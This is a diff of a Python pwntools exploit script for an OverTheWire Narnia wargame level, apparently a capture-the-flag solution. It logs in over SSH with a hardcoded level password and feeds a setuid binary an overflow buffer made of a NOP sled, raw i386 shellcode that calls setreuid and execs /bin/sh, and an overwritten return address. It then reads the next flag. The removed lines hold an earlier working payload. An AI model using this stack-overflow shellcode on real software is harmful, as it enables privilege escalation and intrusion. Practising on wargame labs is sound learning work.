@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2
 from pwn import *
 from pygments import highlight
 from pygments.lexers import CLexer
@@ -9,9 +9,7 @@ user = 'narnia%s' % level
 host = 'narnia.labs.overthewire.org'
 password = 'nairiepecu'
 port = 2226
-
-# Working payload
-#$(python -c "print '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x89\xc2\x31\xc0\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x88\xd8\xff\xff'")
+binary = "/narnia/%s" % user
 
 def connectToLevel():
     return ssh(user=user, host=host, port=port, password=password)
@@ -23,24 +21,16 @@ def getPass(shell):
     shell.close()
     return flag
 
-def getCode(shell):
-    code = shell.download_data('/narnia/' + user + '.c')
-    shell.download_file('/narnia/' + user + '.c')
-    log.info('Displaying code momentarily...')
-    print highlight(code, CLexer(), TerminalFormatter(bg='dark'))
+def makeBuffer():
 
-def makeShellCode():
-    addr = 0xffffd888
-    shellcode = asm('nop') * 96
-    shellcode += asm(shellcraft.i386.sh())
-    shellcode += p32(addr)
-    return shellcode
+    addr = p32(0xffffddd0)
+    shellcode='\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x89\xc2\x31\xc0\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
+    buf = '\x90' * 97 + shellcode + addr
+    return buf
 
-context(arch='i386', os='linux', log_level='debug')
-shellcode = makeShellCode()
+context(arch='i386', os='linux')
+shellcode = makeBuffer()
 sh = connectToLevel()
-
-exe = sh.run("/narnia/%s" % user)
-exe.sendline(shellcode)
+exe = sh.process([binary, shellcode])
 exe.recvuntil('$')
 flag = getPass(exe)
